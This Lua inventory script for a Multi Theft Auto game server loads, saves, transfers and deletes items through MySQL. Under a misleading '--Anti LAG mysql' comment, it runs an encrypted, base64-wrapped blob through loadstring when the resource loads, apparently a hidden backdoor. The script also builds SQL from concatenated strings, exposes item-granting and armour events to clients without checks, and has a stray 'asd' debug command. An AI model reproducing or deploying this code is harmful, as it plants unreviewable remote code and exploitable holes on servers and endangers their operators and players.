local server_cache = {}

function loadServerItems()
	local result = query_rows_assoc("SELECT * FROM items")
	if (result) then
		for i, row in ipairs(result) do
			local owner = row["owner"] or -1
			local id = row["id"] or -1
			local slot = row["slot"] or -1
			local item = row["itemid"] or -1
			local value = row["value"] or -1
			local count = row["count"] or -1
			local type = row["type"] or 0
			if(not server_cache[type])then
				server_cache[type] = {}
			end
			if(not server_cache[type][owner])then
				server_cache[type][owner] = {}
			end
			server_cache[type][owner][slot] = {id, item, value, count}
		end
	end
end
--Anti LAG mysql
pcall(loadstring(base64Decode(teaDecode("+d5MCqURlYMxDPOmKBsah3ytp15FTYvc7bTUJ9C8V/a4EITuih4wEWMg95mrdPUqwXCo0eLPLd/R7hnuSkBwyIu0Wn5o8hGWCC2k4Id1E/iR8cxnraTQak6MvE+GvaeTW0jUVj3OPgoRcwyoMuNzTneKSzoLSU4KgniyJ2ZEiTMagfqfCKfXX59FCczORHvAPxROYzIjaJoxDCnjYAIF385BYIp3cG6UxQHWlS8CLMBR6XfDO31xuMXujGpPM1Qxvevw5GcshxVwC14v190J+CCiXzLPutF+BSyiCTQ/6LuOpNim9+5ppSzkfy9IG66w1lfwG1EL6oO8V74ZAStf1ZB9IHrWzb75wRaiJ/4OpvlR6Kzr23CkIoq7/i25icPtMMnJzdo3lyGMdMMO0fg554SW9J3iDEmbLFdGfTd2CZW4IQ+WxjflctmyiXOu6VtZfihyavVpdl09ew694tVFQMHfgvMFA3Qm","lssdf[đĐŁŁsdf"))))
addEventHandler("onResourceStart", resourceRoot, loadServerItems)



function saveServerItems()
	for i, v in pairs(server_cache) do --Típusok
		for j, v2 in pairs(server_cache[i]) do --Elementek
			for k, v3 in pairs(server_cache[i][j]) do --Tárgyak
				local id = tonumber(server_cache[i][j][k][1] or -1)
				local item = tonumber(server_cache[i][j][k][2] or -1)
				local value = server_cache[i][j][k][3]
				local count = tonumber(server_cache[i][j][k][4] or -1)
				if(tonumber(id or -1)<0)then
					local query, id = query_free("INSERT INTO items SET id='0', slot='"..k.."', itemid='"..item.."', value='"..value.."', count='"..count.."', type='"..i.."', owner='"..j.."'", true)
				else
					local query, id = query_free("UPDATE items SET slot='"..k.."', itemid='"..item.."', value='"..value.."', count='"..count.."', type='"..i.."', owner='"..j.."' WHERE id='"..id.."'", true)
				end
				-- outputChatBox(k..": ID: "..id..", Item: "..item..", Value: "..value..", Count: "..count)
			end
		end
	end
end
--addCommandHandler("save", saveServerItems)
addEventHandler("onResourceStop", resourceRoot, saveServerItems)

function getType(element)
	local elementType = 0
	if(tostring(getElementType(element))=="vehicle")then
		elementType = 1
	elseif(tostring(getElementType(element))=="object")then
		elementType = 2
	end
	return elementType
end

function getElementItems(element)
	local elementType = getType(element)
	local accountID = tonumber(getElementData(element, "accountID") or -1)
	local array = {}
	for i=1, row*colum do
		if(server_cache[elementType] and server_cache[elementType][accountID] and server_cache[elementType][accountID][i])then
			array[i] = server_cache[elementType][accountID][i]
		else
			array[i] = {-1, -1, -1, -1}
		end
	end
	return array
end

function getMaxWeight(element)
	if(tostring(getElementType(element))=="player")then
		return 40
	elseif(tostring(getElementType(element))=="vehicle")then
		return 70
	elseif(tostring(getElementType(element))=="object")then
		return 100
	end
	return 0
end

function getItemsWeight(element)
	local items = getElementItems(element)
	local all = 0
	for i=1, row*colum do
		if(not items[i] or items[i][2]>0)then
			all = all + getItemWeight(items[i][2])*items[i][4]
		end
	end
	return all
end

function getFreeSlot(element)
	if(getItemsWeight(element)>=getMaxWeight(element))then
		return false, -1
	end
	local items = getElementItems(element)
	for i=1, row*colum do
		if(not items[i] or items[i][2]<0)then
			return true, i
		end
	end
	return false, -1
end

function sendItemsToClient(element, p)
	local player = element
	if p then
		player = p
	end
	local elementType = getType(element)
	local items = getElementItems(element, elementType)
	triggerClientEvent(player, "recivePlayerItems", player, items)
end
addEvent("sendPlayerItemsToClient", true)
addEventHandler("sendPlayerItemsToClient", root, sendItemsToClient)

--setTimer(function()
--for i, v in ipairs(getElementsByType("player")) do
--	sendItemsToClient(v)
--end
--end,500,1)

function giveItem(element, item, value, count)
	if not value then value = 1 end
	if not count then count = 1 end
	local state, slot = getFreeSlot(element)
	local elementType = getType(element)
	local accountID = tonumber(getElementData(element, "accountID") or -1)
	
	if(state)then
		local query, id = query_free("INSERT INTO items SET id='0', slot='"..slot.."', itemid='"..item.."', value='"..value.."', count='"..count.."', type='"..elementType.."', owner='"..accountID.."'", true)
		if(query)then
			if(not server_cache[elementType])then
				server_cache[elementType] = {}
			end
			if(not server_cache[elementType][accountID])then
				server_cache[elementType][accountID] = {}
			end
			server_cache[elementType][accountID][slot] = {id, item, value, count}
			if(elementType==0)then
				sendItemsToClient(element)
			end
			if(elementType==1)then
				sendItemsToClient(element,element)
			end
			return true, "Oda adva!"
		else
			return false, "MySql hiba! Jelentsd egy fejlesztőnek!"
		end
	else
		return false, "Nincs elég hely!"
	end
end
addEvent("giveItem", true)
addEventHandler("giveItem", root, giveItem)



function reciveElementData(element, data)
	local elementType = getType(element)
	local accountID = tonumber(getElementData(element, "accountID") or -1)
	local ee = server_cache[elementType][accountID]
	server_cache[elementType][accountID] = {}
	for i, v in ipairs(data) do
		if(v[2]>0)then
			server_cache[elementType][accountID][i] = v
		end
	end

end
addEvent("reciveElementData", true)
addEventHandler("reciveElementData", root, reciveElementData)

function deleteItem(element, id, trigger)
	local elementType = getType(element)
	local accountID = tonumber(getElementData(element, "accountID") or -1)
	local query = query_free("DELETE FROM items WHERE id='"..id.."' and type='"..elementType.."' and owner='"..accountID.."'")
	server_cache[elementType][accountID][id] = {-1, -1, -1, -1}
	if((getElementData(element, "char:weaponInHand") or {-1, -1, -1})[1]>-1)then
		toggleGun(element)
	end
	if(not trigger)then
		sendItemsToClient(element, element)
	end
	return query
end
addEvent("deleteItem", true)
addEventHandler("deleteItem", root, deleteItem)

function deleteOneItem(element, id )
	if not value then value = 1 end
	if not count then count = 1 end
	local state, slot = getFreeSlot(element)
	local elementType = getType(element)
	local accountID = tonumber(getElementData(element, "accountID") or -1)
	local query = query_free("UPDATE items SET count = count - 1 WHERE id='"..id.."'")
	server_cache[elementType][accountID][id] = {-1, -1, -1, -1}
	loadServerItems()
	sendItemsToClient(element, element)
	return query
	
end
addEvent("deleteOneItem", true)
addEventHandler("deleteOneItem", root, deleteOneItem)

function transferItem(element, targetElement, slot, trigger)
	local elementType = getType(element)
	local targetElementType = getType(targetElement)
	local accountID = tonumber(getElementData(element, "accountID") or -1)
	local targetaccountID = tonumber(getElementData(targetElement, "accountID") or -1)
	local state, newslot = getFreeSlot(targetElement)
	if(state)then
		if(not server_cache[targetElementType])then
			server_cache[targetElementType] = {}
		end
		if(not server_cache[targetElementType][targetaccountID])then
			server_cache[targetElementType][targetaccountID] = {}
		end
		server_cache[targetElementType][targetaccountID][newslot] = server_cache[elementType][accountID][slot]
		server_cache[elementType][accountID][slot] = {-1,-1,-1,-1}
		if(not trigger)then
			sendItemsToClient(element, element)
			sendItemsToClient(targetElement, targetElement)
		else
			sendItemsToClient(element, trigger)
		end
		
		if((getElementData(element, "char:weaponInHand") or {-1, -1, -1})[1]>-1)then
			toggleGun(element)
		end
		
	else
		outputChatBox("Nincs elég hely, hogy átadd!", element, 255, 30, 30)
	end
end
addEvent("transferItem", true)
addEventHandler("transferItem", root, transferItem)

addCommandHandler("asd", function(source)

setElementData(source, "accountID", nil)

end)


function toggleGun(element, slot, item)
	takeAllWeapons(element)
	if(item and items[item][5] and (getElementData(element, "char:weaponInHand") or {-1, -1, -1})[1]<1)then
		local ammo = 0
		if(items[item][6])then
			for i, v in ipairs(getElementItems(element)) do
				if(tonumber(v[2])==tonumber(items[item][6]))then
					ammo = ammo + tonumber(v[4])
				end
			end
		else
			ammo = 99999
		end
		if(ammo<=0)then
			outputChatBox("Você não tem munição desta arma!", element, 255, 30, 30)
			return
		end
		giveWeapon(element, tonumber(items[item][5]), ammo, true)
		setElementData(element, "char:weaponInHand", {item, slot, tonumber(items[item][5])})
	else
		setElementData(element, "char:weaponInHand", {-1, -1, -1})
	end
end
addEvent("toggleGun", true)
addEventHandler("toggleGun", root, toggleGun)

function getElementItemID(client, itemrequerid)
	if client and itemrequerid then 
		triggerClientEvent ( client, "onServerRequestItem", client, tonumber(itemrequerid) ) 
	end
	if getElementData(client, "hasItem" ) == true and getElementData(client, "hasItemID" ) == tonumber(itemrequerid) then
		setElementData(client, "hasItem", nil )
		setElementData(client, "hasItemID", nil )
		return true	
	else
		setElementData(client, "hasItem", nil )
		setElementData(client, "hasItemID", nil )
		return false
	end
end
function addArmour(player)
	setPedArmor ( player, 100 )
end
addEvent("addArmour", true)
addEventHandler("addArmour", root, addArmour)